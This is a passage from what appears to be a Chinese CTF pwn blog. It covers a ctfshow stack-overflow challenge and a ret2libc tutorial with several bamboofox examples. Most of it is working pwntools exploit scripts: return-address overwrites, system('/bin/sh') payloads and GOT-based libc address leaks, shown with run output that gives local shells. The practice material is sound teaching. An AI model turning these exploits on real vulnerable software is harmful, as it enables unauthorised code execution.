class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此我们只需要利用栈溢出漏洞覆盖返回地址，将程序的执行流程转向 get_flag 函数，从而获取flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag=elf.sym[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line">payload=cyclic(<span class="number">0x28</span>+<span class="number">4</span>)+p32(flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting local process &#x27;./pwn&#x27;: pid 872</span><br><span class="line">[*] &#x27;/CTFshow_pwn/pwn&#x27;</span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : There are backdoor functions here!</span><br><span class="line">    * *************************************</span><br><span class="line">Find and use it!</span><br><span class="line">Enter what you want:</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure><h2 id="pwn36-29"><a href="#pwn36-29" class="headerlink" title="pwn36"></a>pwn36</h2><p>Hint：存在后门函数，如何利用？</p><p>checksec检查保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure><p>32位保护仅部分开启RELRO，同时注意到有可读可写可执行的段</p><p>32位IDA查看main函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804883C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80488B0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804892C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489B8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A48);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048ACC);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B60);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Stack_Overflow                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : There are backdoor functions here!                      &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Find and use it!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter what you want: &quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进ctfshow函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 gets 函数从标准输入读取一行字符串，并将其存储在 s 数组中。然后，返回指向 s 的指针。 gets 函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。</p><p>还在程序中找到了get_flag函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此我们只需要利用栈溢出漏洞覆盖返回地址，将程序的执行流程转向 get_flag 函数，从而获取flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag=elf.sym[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line">payload=cyclic(<span class="number">0x28</span>+<span class="number">4</span>)+p32(flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 872</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : There are backdoor <span class="built_in">functions</span> here!</span><br><span class="line">    * *************************************</span><br><span class="line">Find and use it!</span><br><span class="line">Enter what you want:</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>3-ret2syscall</title>
      <link href="/2025/07/af208b7d2db8.html"/>
      <url>/2025/07/af208b7d2db8.html</url>
      
        <content type="html"><![CDATA[<h1 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“&#x2F;bin&#x2F;sh”)，故而此时我们需要知道 system 函数的地址。</p><h2 id="例1"><a href="#例1" class="headerlink" title="例1"></a>例1</h2><p>这里我们以 bamboofox 中 ret2libc1 为例。</p><blockquote><p>点击下载: <a href="../../../../../../../challenges/ret2libc1">ret2libc1</a></p></blockquote><p>首先，我们检查一下程序的安全保护：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x ret2libc1</span><br><span class="line">$ checksec ret2libc1</span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">    Debuginfo:  Yes</span><br></pre></td></tr></table></figure><p>源程序为 32 位，开启了 NX 保护。下面对程序进行反编译以确定漏洞位置：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">100</span>]; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;RET2LIBC &gt;_&lt;&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到在执行 gets 函数的时候出现了栈溢出。此外，利用 ropgadget，我们可以查看是否有 &#x2F;bin&#x2F;sh 存在：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ROPgadget --binary ret2libc1  --string <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x08048720 : /bin/sh</span><br></pre></td></tr></table></figure><p>确实存在，再次查找一下是否有 system 函数存在。经在 ida 中查找，确实也存在。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.plt:08048460 _system         proc near               ; CODE XREF: secure+44↓p</span><br><span class="line">.rodata:08048720 aBinSh          db &#x27;/bin/sh&#x27;,0          ; DATA XREF: .data:shell↓o</span><br></pre></td></tr></table></figure><p>那么，我们直接返回该处，即执行 system 函数。相应的 payload 如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc1&#x27;</span>)</span><br><span class="line">binsh_addr = <span class="number">0x8048720</span></span><br><span class="line">system_plt = <span class="number">0x08048460</span></span><br><span class="line">payload = flat([<span class="string">b&#x27;a&#x27;</span> * <span class="number">112</span>, system_plt, <span class="string">b&#x27;b&#x27;</span> * <span class="number">4</span>, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./ret2libc1&#x27;</span>: pid 406</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">RET2LIBC &gt;_&lt;</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">ctfshow_flag  exp.py  pwn  ret2libc1  ret2libc2  ret2libc3</span><br></pre></td></tr></table></figure><p>这里我们需要注意函数调用栈的结构，如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，这里以 <code>&#39;bbbb&#39;</code> 作为虚假的地址，其后参数对应的参数内容。</p><p>这个例子相对来说简单，同时提供了 system 地址与 &#x2F;bin&#x2F;sh 的地址，但是大多数程序并不会有这么好的情况。</p><h2 id="例-2"><a href="#例-2" class="headerlink" title="例 2"></a>例 2</h2><p>这里以 bamboofox 中的 ret2libc2 为例 。</p><blockquote><p>点击下载: <a href="../../../../../../../challenges/ret2libc2">ret2libc2</a></p></blockquote><p>该题目与例 1 基本一致，只不过不再出现 &#x2F;bin&#x2F;sh 字符串，所以此次需要我们自己来读取字符串，所以我们需要两个 gadgets，第一个控制程序读取字符串，第二个控制程序执行 system(“&#x2F;bin&#x2F;sh”)。由于漏洞与上述一致，这里就不在多说，具体的 exp 如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x ret2libc2</span><br><span class="line">$ checksec ret2libc2</span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">    Debuginfo:  Yes</span><br><span class="line">$ ROPgadget --binary ret2libc2  --string <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.plt:08048460 _gets           proc near               ; CODE XREF: main+72↓p</span><br><span class="line">.plt:08048490 _system         proc near               ; CODE XREF: secure+44↓p</span><br><span class="line">.bss:0804A080                 public buf2</span><br><span class="line">.bss:0804A080 ; char buf2[100]</span><br><span class="line">.bss:0804A080 buf2            db 64h dup(?)</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ROPgadget --binary ret2libc2 --only <span class="string">&#x27;pop|ret&#x27;</span> | grep <span class="string">&#x27;ebx&#x27;</span></span><br><span class="line">0x0804872c : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x0804843d : pop ebx ; ret</span><br></pre></td></tr></table></figure><p>选择0x080481c9 : pop ebx ; ret</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc2&#x27;</span>)</span><br><span class="line">gets_plt = <span class="number">0x08048460</span></span><br><span class="line">system_plt = <span class="number">0x08048490</span></span><br><span class="line">pop_ebx = <span class="number">0x0804843d</span> <span class="comment">#清理 Gadget</span></span><br><span class="line">buf2 = <span class="number">0x804a080</span></span><br><span class="line">payload = flat(</span><br><span class="line">    [<span class="string">b&#x27;a&#x27;</span> * <span class="number">112</span>, gets_plt, pop_ebx, buf2, system_plt, <span class="number">0xdeadbeef</span>, buf2])</span><br><span class="line"><span class="comment">#payload=b&#x27;a&#x27;*112+p32(gets_plt)+p32(pop_ebx)+p32(buf2)+p32(system_plt)+p32(0)+p32(buf2)</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>需要注意的是，我这里向程序中 bss 段的 buf2 处写入 &#x2F;bin&#x2F;sh 字符串，并将其地址作为 system 的参数传入。这样以便于可以获得 shell。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./ret2libc2&#x27;</span>: pid 431</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Something surprise here, but I don<span class="string">&#x27;t think it will work.</span></span><br><span class="line"><span class="string">What do you think ?$ ls</span></span><br><span class="line"><span class="string">ctfshow_flag  exp.py  pwn  ret2libc1  ret2libc2  ret2libc3  ret2syscall</span></span><br></pre></td></tr></table></figure><h2 id="例-3"><a href="#例-3" class="headerlink" title="例 3"></a>例 3</h2><p>这里以 bamboofox 中的 ret2libc3 为例 。</p><blockquote><p>点击下载: <a href="../../../../../../../challenges/ret2libc3">ret2libc3</a></p></blockquote><p>在例 2 的基础上，再次将 system 函数的地址去掉。此时，我们需要同时找到 system 函数地址与 &#x2F;bin&#x2F;sh 字符串的地址。首先，查看安全保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x ret2libc3</span><br><span class="line">$ checksec ret2libc3</span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">    Debuginfo:  Yes</span><br></pre></td></tr></table></figure><p>可以看出，源程序仍旧开启了堆栈不可执行保护。进而查看源码，发现程序的 bug 仍然是栈溢出：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">100</span>]; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;No surprise anymore, system disappeard QQ.&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Can you find it !?&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">secure</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">time_t</span> seed; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> input; <span class="comment">// [esp+18h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> secretcode; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  seed = time(<span class="number">0</span>);</span><br><span class="line">  srand(seed);</span><br><span class="line">  secretcode = rand();</span><br><span class="line">  __isoc99_scanf(&amp;unk_8048730, &amp;input);</span><br><span class="line">  <span class="keyword">if</span> ( input == secretcode )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;no_shell_QQ&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么我们如何得到 system 函数的地址呢？这里就主要利用了两个知识点：</p><ul><li>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。</li><li>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。而 libc 在 github 上有人进行收集，如下</li><li><a href="https://github.com/niklasb/libc-database">https://github.com/niklasb/libc-database</a></li></ul><p>所以如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。进而我们就可以知道 system 函数的地址。</p><p>那么如何得到 libc 中的某个函数的地址呢？我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。<strong>当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。</strong></p><p>我们自然可以根据上面的步骤先得到 libc，之后在程序中查询偏移，然后再次获取 system 地址，但这样手工操作次数太多，有点麻烦，这里给出一个 libc 的利用工具，具体细节请参考 readme：</p><ul><li><a href="https://github.com/lieanu/LibcSearcher">https://github.com/lieanu/LibcSearcher</a></li></ul><p>此外，在得到 libc 之后，其实 libc 中也是有 &#x2F;bin&#x2F;sh 字符串的，所以我们可以一起获得 &#x2F;bin&#x2F;sh 字符串的地址。</p><p>这里我们泄露 __libc_start_main 的地址，这是因为它是程序最初被执行的地方。基本利用思路如下</p><ul><li>泄露 __libc_start_main 地址</li><li>获取 libc 版本</li><li>获取 system 地址与 &#x2F;bin&#x2F;sh 的地址</li><li>再次执行源程序</li><li>触发栈溢出执行 system(‘&#x2F;bin&#x2F;sh’)</li></ul><p>exp 如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import LibcSearcher</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>) <span class="comment">#打本地</span></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line">puts_plt =elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">libc_start_main_got = elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">main = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;leak libc_start_main_got addr and return to main again&quot;</span>)</span><br><span class="line">payload = flat([<span class="string">b&#x27;A&#x27;</span> * <span class="number">112</span>, puts_plt, main, libc_start_main_got])</span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;Can you find it !?&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;get the related addr&quot;</span>)</span><br><span class="line">libc_start_main_addr = u32(sh.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">libcbase=libc_start_main_addr-libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">system_addr = libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libcbase + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"><span class="comment">#libc = LibcSearcher(&#x27;__libc_start_main&#x27;, libc_start_main_addr)</span></span><br><span class="line"><span class="comment">#libcbase = libc_start_main_addr - libc.dump(&#x27;__libc_start_main&#x27;)</span></span><br><span class="line"><span class="comment">#system_addr = libcbase + libc.dump(&#x27;system&#x27;)</span></span><br><span class="line"><span class="comment">#binsh_addr = libcbase + libc.dump(&#x27;str_bin_sh&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;get shell&quot;</span>)</span><br><span class="line">payload = flat([<span class="string">b&#x27;A&#x27;</span> * <span class="number">104</span>, system_addr, <span class="number">0xdeadbeef</span>, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 exp.py</span><br><span class="line">[*] <span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Full RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./ret2libc3&#x27;</span>: pid 48</span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">    Debuginfo:  Yes</span><br><span class="line">leak libc_start_main_got addr and <span class="built_in">return</span> to main again</span><br><span class="line">get the related addr</span><br><span class="line">get shell</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">ctfshow_flag  libc-database  ret2libc1ret2libc3</span><br><span class="line">exp.py      pwn     ret2libc2ret2syscall</span><br></pre></td></tr></table></figure><h2 id="例-4"><a href="#例-4" class="headerlink" title="例 4"></a>例 4</h2><blockquote><p>点击下载: <a href="../../../../../../../challenges/ret2libc4">ret2libc4</a><br>需要同时找到 system 函数地址与 &#x2F;bin&#x2F;sh 字符串的地址。<br>使用<code>file</code>和<code>checksec</code>命令查看二进制文件</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ checksec ret2libc4</span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">$ file ret2libc4</span><br><span class="line">ret2libc4: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=6b427b8927f95bdfc8e3a8ee0b5c4af3a7b6a2f6, not stripped</span><br><span class="line">$ ldd ret2libc4</span><br><span class="line">linux-gate.so.1 (0xeb9ed000)</span><br><span class="line">libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xeb7a0000)</span><br><span class="line">/lib/ld-linux.so.2 (0xeb9ef000)</span><br></pre></td></tr></table></figure><p>ida打开分析，在<code>ret2libc</code>函数发现栈溢出漏洞</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">ret2libc</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">136</span>]; <span class="comment">// [esp+0h] [ebp-88h] BYREF</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Welcome to Ret2libc\n&quot;</span>, <span class="number">0x14u</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>思路就是，通过程序默认的<code>write</code>函数地址，调用并输出<code>write</code>函数运行在内存中的真实地址，接着通过偏移分析该程序的<code>libc</code>版本，然后通过<code>libc</code>偏移找到<code>system</code>地址和<code>/bin/sh</code>地址，脚本如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#本地</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context(log_level=&#x27;debug&#x27;)</span></span><br><span class="line">io=process(<span class="string">&#x27;./ret2libc4&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./ret2libc4&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Welcome to Ret2libc\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取程序没有加载到内存 write 的地址</span></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main=elf.sym[<span class="string">&#x27;main&#x27;</span>]  <span class="comment"># main = 0x080484F4 </span></span><br><span class="line"><span class="comment"># 第一次栈溢出，获取write函数在内存中的真实地址</span></span><br><span class="line"><span class="comment"># 返回地址为 main，在执行完write函数再次运行main函数</span></span><br><span class="line"><span class="comment"># write(1,write_got,4)</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(write_plt)+p32(main)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取程序在内存中运行write函数的真实地址</span></span><br><span class="line">write_addr = u32(io.recv(<span class="number">0x4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span 